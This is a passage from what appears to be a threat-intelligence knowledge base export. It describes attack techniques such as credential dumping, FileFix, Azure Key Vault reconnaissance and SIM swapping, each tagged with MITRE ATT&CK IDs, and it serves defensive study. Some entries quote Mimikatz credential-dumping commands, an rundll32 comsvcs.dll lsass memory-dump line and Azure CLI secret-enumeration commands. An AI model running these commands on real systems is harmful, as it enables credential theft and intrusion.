- **Commercial Surveillance Devices:** Commercially available devices can intercept 
GSM traffic, extract encryption keys, and monitor communications. These devices 
are used by law enforcement, intelligence agencies, and sometimes by criminals to 
conduct surveillance or steal information.

- **Notorious Attacks:** There have been documented cases where attackers used GSM 
interception to gain access to bank accounts by intercepting SMS-based authentication codes.
",1,2025-04-16,2025-04-16,,,,,"T1638, T1040, T1589, T1190"
437a43b9-6344-45a9-915b-d733d23173ae,Scheduled task manipulation using Azure Portal,Threat Vectors,clear,"Scheduled tasks in Azure, often called ""WebJobs"" or ""Azure Functions"" with timer 
triggers, are automated processes set to run at specific times or intervals. They 
are used for maintenance, backups, data processing, and other routine operations.

This scheduled tasks can be manipulated by threat actors to execute malicious 
code, steal sensitive information, or disrupt business operations. The manipulation 
of scheduled tasks can be achieved through various means, including:

### Azure metadata service exploitation

Adversaries can abuse the Azure Instance Metadata Service (IMDS) to gather sensitive 
information about virtual machines.  
The IMDSv1 endpoint is particularly vulnerable to Server-Side Request Forgery 
(SSRF) attacks due to its accessibility via GET requests.

### Scheduled events manipulation

Attackers can exploit Azure scheduled events, a feature of the Azure Metadata 
Service, to prepare for and execute attacks during VM maintenance windows.  
This technique allows malicious actors to anticipate system changes and potentially 
exploit vulnerabilities during maintenance periods.

### Custom script extensions

Threat actors can abuse Custom script extensions, which are designed to automate 
post-deployment scripts on VMs.  
This feature can be misused to execute malicious code, install unauthorized software, 
or reconfigure systems for nefarious purposes.      

### Leveraging exploited vulnerabilities

Attackers can use exploited vulnerabilities in Azure services, such as Azure Automation 
or Logic Apps, to create more complex, distributed scheduled actions that are harder to detect.

### Utilizing obfuscated code

Attackers might use obfuscated code within tasks to evade detection and make it 
harder for security teams to identify and mitigate the threat.

### Deleting logs and hiding tracks

Attackers might delete logs related to task creation or modification, and modify 
task descriptions to seem innocuous, in an attempt to hide their tracks and make 
it harder to investigate and remediate the attack.
",2,2024-12-17,2025-02-26,,,"{'support::synergize': ['5e66f826-4c4b-4357-b9c5-2f40da207f34'], 'sequence::preceeds': ['f9a6f927-d08c-40c1-85af-01331c471def']}",,"T1053.005, T1651"
9e93dc4d-486b-43b7-aab7-d3a336a6a72e,iOS Trojan harvesting facial recognition data,Threat Vectors,clear,"The GoldPickaxe Malware Analysis provides an in-depth look at the capabilities of 
a new iOS Trojan named GoldPickaxe.iOS, which is part of a broader suite of malware 
developed by the Chinese-speaking cybercriminal group codenamed GoldFactory.  

GoldPickaxe.iOS is capable of collecting sensitive data, including facial recognition 
data, identity documents, and SMS messages. The Android version, GoldPickaxe.Android, 
shares similar functionalities. The malware exploits AI-driven face-swapping services 
to create deepfakes, enabling unauthorized access to victims' banking accounts, 
a novel technique in cyber theft.  

The initial distribution methods for GoldPickaxe.iOS include:

- Apple's TestFlight platform, where they trick users to download a TestFlight
  app from hxxps://testflight.apple[.]com/join/<ID>.

- Use of social engineering to install a Mobile Device Management (MDM) profile on
  user devices, granting them full control. At any time only one MDM profile can
  be active, but to have several MDM profiles installed in the device is possible.  

The infection chain involves several steps, including receiving a link that leads 
to a fraudulent website, being prompted to install an MDM profile, and granting 
the adversaries control over the device. Once installed, the malware can perform
various malicious activities, including tracking, remote wiping, and installing
additional apps without the user's consent.  
",1,2024-07-19,2024-07-30,,,,,"T1566.001, T1566.002, T1078, T1404"
ec8201d4-c135-406b-a3b5-4a070e80a2ee,Credential manipulation on local Windows endpoint,Threat Vectors,clear,"Credential manipulation on a local Windows endpoint refers to an act of
modifying, altering, or stealing sensitive information such as usernames,
passwords, and other authentication data.   

An example of credential manipulation could be the usage of a tool, for
example like Mimikatz to extract login credentials from memory or to
manipulate and modify existing credentials stored on the local system.
The threat actor could use these manipulated credentials to gain
unauthorized access to other systems or network resources.   

The threat actors abuse and some legitimate administrator tools, such as
the Microsoft Sysinternals tool: ProcDump or Task Manager to dump lsass.exe
process memory and to collect credentials. This approach is common and
known as ""living-off-the-land"", which means usage of legit native Windows
tools in order to avoid possible detection.   

Threat actors can gather, modify or delete credentials on the local Windows
system also by using Windows Explorer manually or with scrips to access
local files that may store user's or system credentials. For example
Keepass or other local databases which contain passwords.   

Examples:   

Threat actors are using Mimikatz LSADUMP Module to collect SAM registry
hashes.   

lsadump::sam   

Or to extract credentials from LSASS Dump files. 
Mimikatz module lsass.exe dumps credentials in a more stealthy mode.
The lsass.exe process manages many user credential secrets and can be
associated with credential theft behavior.   

sekurlsa::minidump lsass.dmp
log lsass.txt
sekurlsa::logonPasswords   

For extracting of Domain Controller cached credentials is used LSADUMP module:
lsadump::cache   

Locally, the threat actors can run sekurlsa Mimikatz module to obtain logon
credentials:   

sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords   

Built-in Windows tools such as comsvcs.dll can also be used:   

rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full   

There are variety of different tools that the threat actors use for
memory dump, for example:   

- Taskmgr.exe
- ProcDump
- ProcessExplorer.exe
- Process Hacker
- SQLDumper
- PowerSploit – Out-MiniDump
- VM Memory Dump Files
- Hibernation Files   
",4,2023-02-02,2025-10-01,,,"{'sequence::succeeds': ['5ea50181-1124-49aa-9d2c-c74103e86fd5', '03cc9593-e7cf-484b-ae9c-684bf6f7199f', '479a8b31-5f7e-4fd6-94ca-a5556315e1b8', '4472e2b0-3dca-4d84-aab0-626fcba04fce'], 'atomicity::implements': ['7351e2ca-e198-427c-9cfa-202df36f6e2a', '06523ed4-7881-4466-9ac5-f8417e972d13', 'e3d7cb59-7aca-4c3d-b488-48c785930b6d', 'a566e405-e9db-475f-8447-7875fa127716'], 'sequence::preceeds': ['2d0beed6-6520-4114-be1f-24067628e93c']}","[Mobile] Sandworm Team, GreyEnergy, [Enterprise] MuddyWater, MuddyWater, [Enterprise] Mustang Panda, RedDelta, [Enterprise] Fox Kitten, Fox Kitten","T1098, T1098.001, T1552.001, T1003.001, T1003"
59d2eb7f-63cd-4ac4-9608-e65663fea667,FileFix technique abuses Windows Explorer to execute commands,Threat Vectors,clear,"The `FileFix` technique is a new social engineering method similar to
`ClickFix` attack. `FileFix` is used by the threat actors to abuse Windows
Explorer and execute malicious commands on a compromised system. This
technique takes advantage of the Windows Explorer feature that allows users
to specify a custom executable to open a file with. The goal of this
technique is to harvest user's credentials. Threat actor can execute
commands through the user's Windows Explorer and deploy further a loader
which drops infostealer, harvesting browsers, wallets and cloud credentials
ref [1],[2].

Unlike `ClickFix`, which tricks users into running malicious commands via
the Windows Run dialog, `FileFix` takes a subtler approach: A malicious
webpage will open a legitimate File Explorer window while covertly copying
a disguised PowerShell one-liner into the clipboard. The user is then asked
to paste into the Explorer address bar (or otherwise paste into a UI), and
the pasted content runs in the user context, often invoking PowerShell to
download and execute follow-on payloads ref [1].  

### How FileFix Works

- User Interaction: The attack typically begins when a user is lured to a
  compromised website that prompts them to perform actions that seem benign, 
  such as opening File Explorer to access a shared document.
- Clipboard Manipulation: The website uses JavaScript to copy a malicious
  PowerShell command to the clipboard while simultaneously opening a File
  Explorer window.
- Execution: The user is instructed to paste the clipboard content into the
  File Explorer address bar, which leads to the execution of the malicious
  command.

To the victims, this process appears to be a simple task of opening a shared
file or folder, making it feel routine and safe. This subtle manipulation
makes `FileFix` a more stealthy and potentially more dangerous evolution of
the `ClickFix` social engineering attack. 
",1,2025-09-24,2025-09-25,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},,"T1555.003, T1204.004"
2404055a-10f8-4c50-9e9b-0f26756e7838,Access token manipulation,Threat Vectors,clear,"### Access token:

An access token is part of the logon session of the user, and it also contains their credentials for
Windows single sign on (SSO) authentication to access local or remote network services.

When a user signs on to a machine ((irrespective of the logon type), the system generates an 
access token for them. With this access token, Windows handles the user identification,
security, and access rights on the system.

### Access token manipulation:

An attacker can manipulate access tokens to make a process appear to be initiated by a different
user account, when in reality, the request was originated by the account of the attacker.

Attackers use access tokens to escalate privileges from administrative to SYSTEM level,
allowing them to undertake malicious operations and remotely access systems in the corporate network.

### Manipulating access token by injecting malware:

- If the current logged-on user on the compromised or infected machine is a member of the administrator
  group of users or is running a process with higher privileges (e.g., by using the “runas” command),
  malware can take advantage of the privileges of the process’s access token to elevate its privileges
  on the system, allowing it to perform privileged tasks.

- Malware can enumerate the Windows processes running with higher privileges (typically SYSTEM level privileges),
  obtain the access tokens for those processes, and utilise the acquired token to launch new processes.
  As a result, the new process is launched in the context of the SYSTEM user, as represented by the token.

- Malware can also perform a token impersonation attack, in which it copies the access tokens of higher-level
  SYSTEM processes, converts them into impersonation tokens using appropriate Windows functionality, 
  and then impersonates the SYSTEM user on the infected machine, thereby elevating its privileges.

### Methods used to manipulate access tokens:  

- Theft of access tokens.
  An attacker can copy and use existing tokens from other processes to undertake malicious activities using 
  the built-in Windows API functions:
    - To make duplicate tokens of existing access tokens, utilise the DuplicateTokenEx() function.
    - The ImpersonateLoggedOnUser() function is used to run the process as another user.
    - Attackers can assign an impersonated token to a thread using the SetThreatToken() function.

- Using a stolen access token to create a new process.
  Use the CreateProcessWithTokenW() function to create a new process with a duplicated token. The attackers
  can use this function to generate tokens that implement the security context of any user they want to impersonate.

- Creating Logon sessions.
  If an attacker has the credentials for any user account, they can use the LogonUser() function to create logon 
  sessions for them remotely. They can then gain a token from the security context of the logged in user, 
  which they can give to a thread to launch a process.
",1,2025-02-03,2025-02-03,,,,"[Enterprise] HAFNIUM, [ICS] Lazarus Group",T1098
78e05130-58a9-49cd-9039-3d7f9ac0bcb5,Volumetric Distributed denial of service (DDoS) attack,Threat Vectors,clear,"Threat actors may wish to cause business disruption, media/public attention,
or to use the pretense of business disruption to disguise other activities. 
Any DDoS attack should always be followed up with other DFIR activities to 
determine if the attack was meant to distract from something else. DDoS can 
distract by pulling attention away, or even by spooling out log files so 
that relevant entries are overwritten.
",4,2022-11-23,2023-01-23,,,,"[Mobile] APT28, APT28",T1498
cc9003f7-a9e3-4407-a1ca-d514af469787,Lateral movement via a compromised Teams account,Threat Vectors,clear,"Lateral movement refers to attackers exploiting compromised accounts or systems 
to navigate through a network and gain access to sensitive resources. In the context 
of Microsoft Teams, attackers leverage its collaboration features and integrations 
to move laterally within an organization environment. Here are the main techniques 
and risks associated with this threat:    

### How Attackers Exploit Teams for Lateral Movement
1. **Compromised Accounts**  
  - Attackers gain access to low-privileged Teams accounts through phishing or 
  credential theft. These accounts are then used to impersonate trusted users and 
  escalate privileges.
  - Sensitive credentials stored on shared systems can be exploited for lateral moves.    

2. **File Sharing Abuse**  
  - Malicious files (e.g., malware-laden executables or scripts) are distributed 
  through Teams chats or channels, targeting internal users.  
  - These files can auto-execute or trick users into running them, enabling attackers 
  to infect other systems.    

3. **Federated Trust Exploitation**  
  - Misconfigured external access settings allow attackers from federated tenants 
  to infiltrate and move laterally between organizations.    

4. **Remote Execution Tools**  
  - Attackers use Teams-integrated tools like Quick Assist or remote desktop protocols 
  (RDP) to execute commands on other systems, furthering their movement.    

5. **Credential Theft Techniques**  
  - Methods like Pass-the-Hash (PtH) or Pass-the-Ticket (PtT) are used to steal 
  authentication data from compromised systems, enabling attackers to impersonate 
  users across the network.    

### Risks of Lateral Movement via Teams
- **Domain Compromise**: Attackers can move towards domain controllers by exploiting 
stored credentials or misconfigurations.
- **Sensitive Data Access**: Lateral movement enables access to high-value assets 
such as financial records, intellectual property, or administrative accounts.
- **Stealthy Operations**: Native tools and legitimate credentials make detection 
harder, as malicious actions appear normal in audit logs.    
",1,2025-04-01,2025-04-01,,,"{'sequence::succeeds': ['06c60af1-5fa8-493c-bf9b-6b2e215819f1'], 'support::enabling': ['b663b684-a80f-4570-89b6-2f7faa16fece']}",,"T1210, T1534, T1570, T1563, T1550"
60bd6a35-3a71-47c2-8110-4562fb40976c,Virtual machine deployment detection evasion technique,Threat Vectors,clear,"A threat actor can use virtualisation platforms and utilities
to compromise an environment. For example, an installed virtual
machine can be used for an entry point to the rest of the
environment or as an entry point for reconnaissance and
pivoting to the system host and further potentially to
other systems in the environment.  

The goal is to establish persistence on the victim's system. 
Once inside, the threat actor deploy's virtual machine using
any virtualisation technology, which may contain a backdoor, allowing
them to maintain a covert presence on the network in days, weeks or
even longer ref [1].     

### Possible platforms for virtualisation used for detection evasion

A threat actor can deploy a virtual machine using one of the virtualisation
platforms below:

- Hyper-V
- EXS/ESXi (VMware virtualisation)
- QEMU virtualisation
- Virtual box

Once deployed, the virtual machine may contain a backdoor or another
type of a malware (example: QDoor backdoor). This technique allows
a threat actor to maintain a covert channel on the network for unnoticed
period of time. During this period, they can escalate privileges, move
laterally across the environment, and exfiltrate valuable or sensitive
organisational data using data-exfiltration tools. For example, such
data-exfiltration tool can be `GoodSync` tool ref [1], [2].      
",1,2025-06-02,2025-07-04,,,{'sequence::succeeds': ['c4456134-df7b-4969-b5ff-a24794996890']},,T1497
63ab0120-28bc-4081-8184-c45d68b144b2,"access to management plane of security, network, or endpoint management appliances",Threat Vectors,clear,"### overall description
Cyber espionage threat actors continue to target technologies that do not 
support endpoint detection and response (EDR) solutions such as firewalls, 
IoT devices, hypervisors, VPN technologies (e.g. Fortinet, SonicWall, 
Pulse Secure, and others) or endpoint management solutions like 
Endpoint Manager Mobile (EPMM).  

Those targets are often delivered as appliances (bundle of hardware and 
software) and most of the time they do not have full-fleshed OS features 
and come with limited command line interfaces.  

Best practice is to have out-of-band (OoB) management from a central 
management console (dedicated network segment).  

Network seggregation, identity and access management for this OoB segment 
has to be strictly configured and monitoring in place to detect any unusual
source, account or actions performed.  

This can be a challenging objective as it depends on the level of verbosity
of aufit logs (if any).  

If configuration is loose or management access is inadvertly allowed 
from other interfaces, attackers may use valid accounts to access the 
management plane of the device.  

Moreover those devices are most of the time by definition inline of 
network flows coming from Internet. Attacker may obtain a Zero-day 
vulnerability resulting in access to command line interface of the 
device from the Internet-facing interfaces or privileged access 
(adminitrator).

### examples of specific attacks
#### attack against Fortinet Fortigate firewall
The attack against Fortigate is an illustration of the latter.  
The following appliances have been in scope:
  - FortiGate: FortiGate units are network firewall devices which allow 
  for the control and monitoring of network traffic passing through the
  devices.
  - FortiManager: The FortiManager acts as a centralized management
  platform for managing Fortinet devices.
  - FortiAnalyzer: The FortiAnalyzer acts as a centralized log management 
  solution for Fortinet devices as well as a reporting platform.

The following steps generally describe the actions the threat actor took:
  - Utilized a directory traversal zero-day (CVE-2022-41328) exploit to 
  write files to FortiGate firewall disks outside of the normal bounds 
  allowed with shell access.
  - Maintained persistent access with Super Administrator privileges within
   FortiGate Firewalls through ICMP port knocking 
  - Circumvented firewall rules active on FortiManager devices with a 
  passive traffic redirection utility, enabling continued connections to 
  persistent backdoors with Super Administrator privileges
  - Established persistence on FortiManager and FortiAnalyzer devices 
  through a custom API endpoint created within the device
  - Disabled OpenSSL 1.1.0 digital signature verification of system files
   through targeted corruption of boot files 

#### attack against Ivanti Endpoint Manager Mobile (EPMM) 
""An authentication bypass vulnerability in Ivanti EPMM allows unauthorized 
users to access restricted functionality or resources of the application 
without proper authentication,""  

A ""trusted source"" informed Ivanti that CVE-2023-35078 was exploited in 
attacks against a limited number of customers.  
",3,2023-05-19,2023-08-10,,,,"[Enterprise] APT29, UNC2452, [Enterprise] Gamaredon Group, Gamaredon Group, [Enterprise] Mustang Panda, RedDelta, [Mobile] Sandworm Team, GreyEnergy, [Enterprise] Threat Group-3390, APT27, [Enterprise] GALLIUM, GALLIUM, [Enterprise] MuddyWater, MuddyWater, [Enterprise] MuddyWater, MuddyWater","T1027, T1068, T1070, T1070.003, T1070.004, T1078, T1140, T1202, T1222, T1497, T1497.001"
d15bff6c-b902-4975-ad3a-7a18f3026aca,Hide Artifacts using NTFS File Attributes,Threat Vectors,clear,"Threat actors are using a hiding technique to conceal malicious files,
folders, or other artifacts on a Windows system by leveraging the attributes
of the NTFS file system. NTFS provides a range of attributes that can be
used to hide or obscure files and folders, making them difficult to detect
ref [1].  

Threat actors may use NTFS alternate data stream attribute to evade
detection and deliver binary or other files that would have been otherwise
blocked by the security controls.

They may store malicious data or binaries in file attribute metadata instead
of directly in files. This may be done to evade some defenses, such as
static indicator scanning tools and anti-virus ref [1], [2].      

An example is to attach a binary or a DLL as an ADS to a PDF file or text
file that does not contain anything suspicious (decoy content) and acts just
a carrier for the malicious payload store into the ADS.

In one of the malicious campaign a Russian affiliated threat actor is
observed to use Alternate Data Streams (ADSes) vulnerability `CVE-2025-8088`
for path traversal. The attackers specially crafted the archive to
apparently contain only one benign file, while it contains many malicious
addresses. Once a victim opens this seemingly benign file, WinRAR unpacks it
along with all its ADSes ref [5].  

### Known Techniques used by Threat Actors

- Setting attributes using the command line - a malicious operator can use
  the attrib command to set attributes on files and folders.
- Using API calls -  threat actor can use Windows API calls, such as
  `SetFileAttributes` or `SetFileAttribute`, to set attributes on files and
  folders.
- Exploiting vulnerabilities - exploit vulnerabilities in software or the
  operating system is another common used technique. Using these type of
  vulnerabilities a threat actor can set attributes on files and folders
  without being detected.        
",1,2025-06-27,2025-08-26,,,{'atomicity::implements': ['b330d3a8-1783-4210-9fec-11e6ecfe135e']},"[Mobile] APT28, APT28, RomCom",T1564.004
81338b90-f80c-40cc-8a57-ba97cdf86948,Azure - Key Vault reconnaissance,Threat Vectors,clear,"Azure Key Vault reconnaissance refers to the techniques and activities adversaries 
use to discover, enumerate, and gather information about Azure Key Vault resources 
within a target environment. The goal is to identify valuable secrets, misconfigurations, 
and potential attack paths, often as a precursor to privilege escalation, lateral movement, 
or data exfiltration.

## Why Azure Key Vaults Are Targeted

- **High Value**: Key Vaults store cryptographic keys, secrets (like API keys and passwords), 
and certificates, making them attractive to attackers.
- **Widespread Usage**: They are commonly used by organizations to manage sensitive 
information for applications and services.

## Common Reconnaissance Techniques

### Enumeration of Key Vaults

Attackers with the `Microsoft.KeyVault/vaults/read` permission can list all Key 
Vaults in a subscription, revealing vault names and resource groups. This helps 
identify which vaults to target based on naming conventions or access policies.

- **Azure CLI Example**:  
  `az keyvault list --query ""[].{Name:name, ResourceGroup:resourceGroup}"" -o table`

### Listing Keys, Secrets, and Certificates

Once a vault is identified, attackers may attempt to enumerate keys, secrets, and 
certificates within it, provided they have appropriate permissions. This can expose 
metadata that hints at the vault’s contents and potential value.

- **Azure CLI Example**:  
  `az keyvault secret list --vault-name  --query ""[].{Name:name, Enabled:attributes.enabled}"" -o table`

### Access Policy and RBAC Reconnaissance

Attackers may enumerate access policies and RBAC assignments to identify users, 
service principals, or managed identities with privileged access. Misconfigurations 
or excessive permissions can be exploited for further attacks.

- **Azure CLI Example**:  
  `az keyvault show --name  --query ""properties.accessPolicies[].{ObjectId:objectId, Permissions:permissions}""`

### Control Plane vs. Data Plane Enumeration

Reconnaissance can occur via both the management/control plane (e.g., Azure Resource Manager API) 
and the data plane (direct Key Vault API). Weak separation or insufficient RBAC 
enforcement between these planes can increase risk.

### Exploiting Network and Access Misconfigurations

Attackers may probe for Key Vaults with public network access enabled or weak firewall 
rules, increasing the likelihood of successful enumeration and subsequent attacks.
",3,2025-06-16,2025-09-08,,,"{'atomicity::implements': ['bcf3bb96-ed97-4853-98ab-937c2d214f4e'], 'support::enabled': ['2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d']}",,"T1555.006, T1082, T1555"
66aafb61-9a46-4287-8b40-4785b42b77a3,Adversary in the Middle phishing sites to bypass MFA,Threat Vectors,clear,"Threat actors use malicious attachments to send the users 
to redirection site, which hosts a fake MFA login page.
The MitM page completes the authentication flow by interfacing
with the legitimate IdP, and captures valid accounts",5,2022-07-13,2024-11-11,,,{'atomicity::implements': ['4a807ac4-f764-41b1-ae6f-94239041d349']},Storm-0829,"T1566.002, T1557, T1539, T1556, T1078.004"
c4edae81-5790-4b9c-88b7-d11d6985b1a4,Azure - Service Principal Secret Reveal,Threat Vectors,clear,"The following threat vector involves an adversary revealing a service principal's 
secret (a credential) in plain text, which can then be used for unauthorized access 
and further attacks.

### Example Attack Scenario

An adversary targets an Azure Function App that uses a service principal for authentication. 
The attacker exploits the Function App by manipulating its application logic to 
reveal the service principal's secret in plain text. This secret, which acts like 
a password, provides direct authentication access as the service principal identity, 
enabling the attacker to escalate privileges or move laterally within the Azure environment.

### Attack Goals and Impact

The primary goal of the ""Service Principal Secret Reveal"" attack is to gain unauthorized 
access to service principal credentials. With these credentials, the attacker can:

- Authenticate as the service principal identity.
- Access resources and perform actions permitted to the service principal.
- Potentially escalate privileges by abusing the service principal's permission scope.
- Maintain persistence in the environment by leveraging the stolen secret.
- Move laterally across Azure resources to further compromise the target environment.

### Attack Flow and Methodology

1. **Identify Target Service Principal**: The attacker discovers that the Function 
App uses a service principal for authentication.
2. **Manipulate Function App Logic**: The attacker modifies the Function App's code 
or configuration to extract and reveal the service principal's secret in plain text.
3. **Secret Disclosure**: The service principal secret is exposed and accessible 
to the attacker.
4. **Credential Use**: The attacker uses the secret to authenticate as the service 
principal identity.
5. **Privilege Escalation and Lateral Movement**: Using the service principal's 
permissions, the attacker can escalate privileges and move laterally across Azure resources.
6. **Persistence and Further Exploitation**: The attacker may maintain persistent 
access, harvest additional credentials, or exfiltrate sensitive data.
",1,2025-09-18,2025-09-19,,,"{'support::enabled': ['53063205-4404-4e6d-a2f5-d566c6085d96', '4e7eae8e-6615-41f2-bfe1-21a04f7a6088', 'fe6827f2-efb4-43b3-9ca3-b7d417111b32', 'bb2501d5-99c7-44a6-ac5a-9510102d6611'], 'support::enabling': ['5d43ef75-4637-4a75-b1ed-6716052cff0e', 'c7e260d8-d391-41eb-be1a-7f276c99b383'], 'atomicity::implemented': ['2743bf18-3b86-4721-bf3e-153dcda0b149']}",,"T1098.001, T1078.004, T1526"
82dce94c-7b18-4cb9-bae0-56716b580418,Manipulation of credentials stored in plain text files,Threat Vectors,clear,"Threat actors are searching for credentials stored in plain text, usually in
an application's properties, configuration files, system memory or other
places in the system. Storing a plain text password could lead to data
leakage because, for example when the passwords are stored in clear text
in a configuration file everyone who has read access to the file can see
and steal the passwords. In most cases, even storage of a plaintext
password in a memory is considered as a security risk if the password
is not cleared immediately after it is used. Good password management
policies require that a password shouldn't be stored in a plaintext.

In some cases the user's passwords are stored in plain text when a program
application or system file crates and saves them automatically in a file
without encryption. In other cases the credentials can be stored in clear 
text by user's mistake. Threat actors are using different methods like:
password cracking, dictionary attack, social engineering and phishing
attacks, man in the middle attack, malware injections and others to steal
and manipulate credentials stored in a plain text.

One example of manipulation of credentials stored in plain text files is by
using a technique called ""password cracking."" This involves using a computer
program to repeatedly guess a password or its hash until the correct one is
found. If the plain text file containing the credentials is not properly
secured, an attacker could gain access to sensitive information such as
username and password combinations. Threat actors are using variety of
different tools to crack user's credentials, for example: John the Ripper,
Hashcat, Aircrack-ng, Cain and Abel, Mimikatz, custom python scripts and
others. 

Example for a code that reads a password from a properties file and uses
the password to connect to a database:

Properties prop = new Properties();
prop.load(new FileInputStream(""config.properties""));
String password = prop.getProperty(""password"");

DriverManager.getConnection(url, usr, password);

Example for a python script scanning for files stored in a clear text:

# put your path here 
# Network SMB path you want to search 
root_dir = (""xxxxxx"", ""etc."")
# location where you want to put the result 
stored_dir = 'xxxxxxxxx'
# exception you want to filter
exception_path = [""snapshot""]
",3,2023-01-30,2023-02-03,,,,"[Enterprise] APT29, UNC2452, [Enterprise] APT37, APT37, [ICS] FIN6, FIN6, [Mobile] LAPSUS$, LAPSUS, [ICS] FIN7, FIN7, [ICS] Wizard Spider, UNC1878","T1552, T1565, T1003, T1555.003, T1110.002, T1003.007"
d370aaea-c3e5-4d58-a6c9-3d1a7ffe50e3,AWS Stop Logging CloudTrail,Threat Vectors,clear,"### AWS Stop Logging CloudTrail Threat

The ""AWS Stop Logging CloudTrail"" threat is a malicious action where an attacker 
deliberately disables AWS CloudTrail logging. This intentional act poses a significant 
risk to AWS users, and understanding its nature, purpose, and implications is crucial 
for maintaining and protecting CloudTrail logs.

### Nature of the Threat

1. **Definition**: It's an intentional act to stop AWS CloudTrail from recording 
API activity and events within an AWS account.
2. **Method**: The attacker uses the AWS API, specifically the `StopLogging` operation 
on a CloudTrail trail.
3. **Target**: The primary target is the CloudTrail service, which is responsible 
for logging and monitoring AWS account activity.

### Purpose and Motivation

1. **Evasion**: The main goal is to evade detection by stopping the recording of 
actions taken in the AWS environment.
2. **Concealment**: Attackers aim to hide their tracks and prevent their activities 
from being logged.
3. **Persistence**: By disabling logging, attackers can maintain access and perform 
actions without leaving a trail.

### Potential Impact

1. **Loss of Audit Trail**: Critical information about API calls and account activity 
is no longer recorded.
2. **Compliance Violations**: Many regulatory standards require continuous logging, 
which this threat violates.
3. **Increased Vulnerability**: Without logs, identifying and responding to other 
security incidents becomes significantly harder.
4. **Extended Attacker Freedom**: Attackers can perform various malicious activities 
without fear of being logged.
5. **Data Loss**: Any actions performed while logging is disabled are permanently 
lost and cannot be retroactively captured.

### Broader Implications

1. **Part of Larger Attacks**: This action is often part of a more extensive attack 
strategy, potentially indicating a sophisticated adversary.
2. **Indicator of Compromise**: The act of stopping CloudTrail logging is itself 
a strong indicator that an account has been compromised.
3. **Time-Sensitive Impact**: Every moment CloudTrail logging remains disabled increases 
the potential damage and loss of critical audit information.

### Identifying the Threat

StopLogging is a critical action that adversaries may use to evade detection. By 
halting the logging of their malicious activities, attackers aim to operate undetected 
within a compromised AWS environment. Identifying such behavior is important, as 
it signals an attempt to undermine the integrity of logging mechanisms, potentially 
allowing malicious activities to proceed without observation. The impact of this 
evasion tactic is significant, as it can severely hamper incident response and forensic 
investigations by obscuring the attacker's actions.
",1,2024-10-31,2024-10-31,,,,,T1562.008
b6543cff-2e86-4fe6-afb7-6d3595188190,Azure - Steal Service Principal Certificate,Threat Vectors,clear,"The following threat vector involves adversaries targeting certificates used by 
Azure service principals (especially in Automation Accounts using `RunAs` accounts) 
to gain unauthorized access. 

### Example Attack Scenario

An attacker gains access to an Azure Automation Account that uses a RunAs account 
for automation workflows. By editing or creating a new Runbook in the compromised 
Automation Account, the adversary modifies the runbook to extract and display the 
private certificate associated with the Service Principal. Once the runbook is executed, 
the certificate is exposed, often as plain text in output logs or variables. The 
attacker then downloads or copies this certificate file for later use.

### Attack Goals and Impact

The attacker’s main goal is to obtain a valid authentication method for the targeted 
service principal by stealing its certificate. With the certificate and its private 
key, the attacker can:
- Authenticate as the service principal to Azure AD and access resources the principal 
is authorized to access.
- Perform privilege escalation or lateral movement by leveraging the service principal's 
permissions, possibly affecting critical resources or sensitive operations.
- Maintain persistence and evade detection since service principal authentication 
is a common and legitimate operational pattern in cloud automation.

### Attack Flow and Methodology

1. Attacker identifies runbooks and determines which ones use `RunAs` authentication.
2. Adversary writes or edits a runbook to programmatically extract the `RunAs` certificate 
from its local storage or configuration.
3. Attacker executes the runbook, which outputs or transmits the certificate (sometimes 
via logging or storage).
4. The adversary captures and exfiltrates the certificate and private key material, 
either through Azure portal log downloads, storage account access, or interactive 
session output.
5. With the certificate, the attacker can authenticate to Azure as the service principal, 
perform malicious operations, and potentially move laterally or escalate privileges, 
depending on the permissions assigned to the compromised principal.
",1,2025-09-25,2025-09-26,,,"{'sequence::succeeds': ['140907eb-c9fb-4330-9d71-656422388b2b', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '2743bf18-3b86-4721-bf3e-153dcda0b149'], 'sequence::preceeds': ['61ddc240-e5a6-4ca8-ae77-6b471b498913', '23f6a192-a25d-48b8-a235-7bb55e483682'], 'support::enabled': ['bb2501d5-99c7-44a6-ac5a-9510102d6611', '53063205-4404-4e6d-a2f5-d566c6085d96', 'a8c7b250-a2d4-4a0d-82f8-23dc99c77d7b']}",APT29,"T1649, T1098.001, T1078.004"
6a7a493a-511a-4c9d-aa9c-4427c832a322,SIM-card swapping,Threat Vectors,clear,"SIM swapping is a malicious technique where threat actors target mobile carriers to gain access to
users bank accounts, virtual currency accounts, and other sensitive information.
They primarily conduct SIM swap schemes using social engineering, insider threat, or phishing techniques.

Social engineering involves impersonating an user and tricking the mobile carrier into switching the
user's mobile number to a SIM card in the attackers' possession.

Attackers using insider threat to conduct SIM swap schemes pay off a mobile carrier employee to switch an
user's mobile number to a SIM card in the attackers' possession. They often use phishing techniques to
deceive employees into downloading malware used to hack mobile carrier systems that carry out SIM swaps.

Once the SIM is swapped, the user's calls, texts, and other data are diverted to the attackers' device.
This access allow the attackers to send 'Forgot Password' or 'Account Recovery' requests to the 
user's email and other online accounts associated with the user's mobile telephone number. 

Using SMS-based two-factor authentication, mobile application providers send a link or one-time passcode 
via text to the user's number, now owned by the attackers, to access accounts. The attacker uses the codes
to login and reset passwords, gaining control of online accounts associated with the user's phone profile.
",1,2024-10-23,2024-11-13,,,{'atomicity::implements': ['4a807ac4-f764-41b1-ae6f-94239041d349']},"[Mobile] LAPSUS$, LAPSUS, [Enterprise] APT29, UNC2452",T1541
4a4a7c81-ca98-4761-8f23-7ef6354e9d1c,Android attack using app running on emulator,Threat Vectors,clear,"The threat vector involves exploiting emulated environments to bypass security measures, 
automate malicious activities, and manipulate app behavior. Below are key aspects 
of this threat:

## How the Attack Works
1. **Exploitation of Emulators**:
  - Android emulators like NoxPlayer, BlueStacks, or custom emulator farms are 
  used by attackers to mimic legitimate devices and bypass app security mechanisms.
  - Emulators provide attackers with a controlled environment to test and refine 
  their techniques before deploying them at scale.

2. **Fraudulent Activities**:
  - **Spoofing Device Identifiers**: Attackers use emulators to replicate legitimate 
  device identifiers (e.g., IMEI, OS version) obtained through malware or phishing 
  attacks, making fraudulent transactions appear genuine.
  - **Automation**: Scripts and automation frameworks enable large-scale fraud, 
  such as creating fake accounts, performing unauthorized transactions, or bypassing 
  authentication systems.
  - **Data Manipulation**: Emulators allow attackers to intercept and modify app 
  data or API calls for malicious purposes.

3. **Advanced Techniques**:
